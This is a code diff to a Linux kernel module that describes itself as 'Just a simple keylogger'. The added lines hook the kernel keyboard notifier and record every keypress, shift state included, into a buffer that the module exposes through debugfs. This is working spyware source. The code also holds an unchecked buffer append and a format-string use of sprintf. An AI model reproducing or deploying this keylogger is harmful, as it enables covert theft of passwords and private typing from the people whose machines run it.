@@ -4,15 +4,59 @@ MODULE_AUTHOR("8xbit");
 MODULE_VERSION("1.0");
 MODULE_DESCRIPTION("Just a simple keylogger");
 MODULE_SUPPORTED_DEVICE("Not machine dependent");
+/*vars for makeing files*/
 static struct dentry *file;
 static struct dentry *file1;
-
 static struct dentry *subdir;
+/*########*/
 int ret = 0;
+int len;
+
+
+//corvent the keycode to string 
+int keycode_to_string(int key_press, int shift, char* buff)
+{
+    char* tav;  
+    if (shift)
+    {
+        /*hundle as shift*/
+        tav = keycode[key_press][1];
+    }
+    else
+    {
+        tav = keycode[key_press][0];
+    }
+        len = sprintf(buff,tav);
+        return len;      
+}
+//callback function
+int notifier(struct notifier_block *block, unsigned long code, void *p)
+{
+    struct keyboard_notifier_param *param =(struct keyboard_notifier_param*) p;
+    char keybuffer[12] = {0};
+
+    if (!(param->down))
+        return NOTIFY_OK;
+
+    if (code == KBD_KEYCODE)
+    {
+        len = keycode_to_string(param->value, param->shift, keybuffer) ;  
+        if (strlen(keybuffer)> 0 && len)
+        {
+            printk(KERN_ALERT "notifer type to msg ptr");
+            strncpy(msg_Ptr+ buf_pos, keybuffer, len);
+            buf_pos+=len;
+            
+                    
+        }
+
+    }
+    return NOTIFY_OK;
+}
 
 static struct notifier_block keylogger ={.notifier_call = notifier};
 
-
+//MODULE INIT
 static int __init MOD_LOAD(void)
 {
     ret = driver_entry();
@@ -76,6 +120,7 @@ static int __init MOD_LOAD(void)
     return ret;
 
 }
+//MODULE EXIT
 static void __exit MOD_UNLOAD(void)
 {
    unregister_keyboard_notifier(&keylogger);
@@ -83,11 +128,6 @@ static void __exit MOD_UNLOAD(void)
     debugfs_remove_recursive(subdir);
     printk(KERN_ALERT "Keylogger: unload the module");
 } 
-
-
-
-
-
 
 module_init(MOD_LOAD);
 module_exit(MOD_UNLOAD);
